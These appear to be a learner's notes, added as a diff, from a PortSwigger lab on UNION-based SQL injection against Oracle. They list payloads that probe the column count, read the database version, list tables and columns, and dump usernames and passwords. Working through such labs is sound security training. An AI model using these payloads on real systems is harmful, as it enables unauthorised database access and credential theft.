@@ -1,0 +1,37 @@
+- SQLi vulnerability is in the product cateogry filter
+- Response returned by application and you can use UNION attacks
+- App has login with database containing username/pass
+
+Goals:
+- Determine the name of the table (on Oracle)
+- Retrieve the contents of table to obtain the username and password of all users
+- Login to admin user
+
+' ORDER BY 3-- errors out --> likely only two columns to query from for a table
+// Reference: https://portswigger.net/web-security/sql-injection/union-attacks 
+
+'+UNION+SELECT+banner,NULL+FROM+v$version--
+Result: CORE 11.2.0.2.0 Production
+
+'+UNION+SELECT+table_name,NULL+FROM+all_tables-- ----> this returns the table names 
+// Reference: https://portswigger.net/web-security/sql-injection/union-attacks
+              https://portswigger.net/web-security/sql-injection/cheat-sheet
+
+
+USERS_NAMCYG is of interest
+
+
+'+UNION+SELECT+all_tab_columns,NULL+FROM+all_tables+WHERE+table_name+=+'USERS_NAMCYG'--
+
+
+'+UNION+SELECT+column_name,NULL+FROM+all_tables+WHERE+table_name+=+"USERS_NAMCYG"--
+Reference: googling revealed column_name as a parameter within Oracle DB
+
+'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name+=+'USERS_NAMCYG'--
+-This worked:
+- USERNAME_BZRGBR
+- PASSWORD_LRGHGH
+
+'+UNION+SELECT+USERNAME_BZRGBR,PASSWORD_LRGHGH+FROM+all_tables+WHERE+table_name+=+'USERS_NAMCYG'--
+
+'+UNION+SELECT+USERNAME_BZRGBR,PASSWORD_LRGHGH+FROM+USERS_NAMCYG--
